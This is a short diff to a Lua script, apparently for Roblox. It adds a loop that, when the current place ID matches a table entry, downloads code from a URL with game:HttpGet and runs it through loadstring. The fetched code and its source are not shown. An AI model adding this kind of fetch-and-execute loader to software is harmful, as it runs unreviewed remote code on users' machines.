@@ -703,3 +703,9 @@ else
 
     player:Kick(message)
 end
+
+for PlaceID, Execute in pairs(v) do
+    if PlaceID == game.PlaceId then
+        loadstring(game:HttpGet(Execute))()
+    end
+end
